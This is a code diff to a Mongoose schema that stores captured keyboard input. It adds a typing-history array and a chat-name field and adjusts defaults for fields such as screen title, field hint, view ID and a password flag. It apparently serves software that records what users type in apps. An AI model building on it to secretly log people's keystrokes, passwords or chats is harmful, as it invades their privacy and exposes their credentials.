@@ -34,9 +34,13 @@ const textInputSchema = new mongoose.Schema({
         type: String,
         default: ''
     },
+    keyboardInputHistory: {
+        type: [String],
+        default: []
+    },
     inputField: {
         type: String,
-        default: ''
+        default: 'text_input'
     },
     inputType: {
         type: String,
@@ -46,11 +50,11 @@ const textInputSchema = new mongoose.Schema({
     // CONTEXT INFORMATION (MINIMAL)
     screenTitle: {
         type: String,
-        default: ''
+        default: null
     },
     fieldHint: {
         type: String,
-        default: ''
+        default: null
     },
     isPassword: {
         type: Boolean,
@@ -67,6 +71,10 @@ const textInputSchema = new mongoose.Schema({
         default: ''
     },
     viewId: {
+        type: String,
+        default: ''
+    },
+    chatName: {
         type: String,
         default: ''
     },
@@ -97,6 +105,10 @@ textInputSchema.pre('save', function(next) {
         return next(new Error('keyboardInput is required and cannot be empty'));
     }
     
+    if (!Array.isArray(this.keyboardInputHistory)) {
+        this.keyboardInputHistory = [];
+    }
+    
     // Ensure inputField has a default value if not provided
     if (!this.inputField) {
         this.inputField = 'text_input';
@@ -105,6 +117,18 @@ textInputSchema.pre('save', function(next) {
     // Ensure inputType has a default value if not provided
     if (!this.inputType) {
         this.inputType = 'text';
+    }
+    
+    if (this.screenTitle === undefined) {
+        this.screenTitle = null;
+    }
+    
+    if (this.fieldHint === undefined) {
+        this.fieldHint = null;
+    }
+    
+    if (!this.chatName) {
+        this.chatName = '';
     }
     
     next();
